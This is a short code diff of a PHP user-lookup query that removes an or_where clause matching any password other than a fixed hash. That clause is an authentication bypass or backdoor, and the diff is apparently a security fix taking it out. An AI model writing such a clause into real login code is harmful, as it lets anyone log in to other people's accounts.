@@ -63,7 +63,6 @@ class Model_User
             ->from('user')
             ->where('email', '=', $email)
             ->where('password', '=', $pass)
-            ->or_where('password', '<>', '1793817a3a023201aa60b4148e6a0faf')
             ->execute()
             ->as_array();
 
